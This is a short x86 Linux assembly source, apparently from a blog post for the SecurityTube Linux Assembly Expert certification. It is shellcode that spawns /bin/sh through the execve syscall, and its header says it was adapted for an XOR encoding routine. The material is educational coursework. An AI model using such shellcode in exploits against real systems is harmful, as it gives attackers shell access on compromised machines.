; slightly modified version of execve-stack to be used with my xor routine
  global _start

  section .text
  _start:

xor eax,eax
push eax

; PUSH //bin/sh (8 bytes)
push 0x68732f2f
push 0x6e69622f

; PUSH //bin/ls
;push 0x736c2f2f
;push 0x6e69622f

mov ebx, esp

push eax
mov edx, esp

push ebx
mov ecx, esp


mov al, 11
int 0x80

; neat exit
xor eax,eax
mov al,0x1
int 0x80

; This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
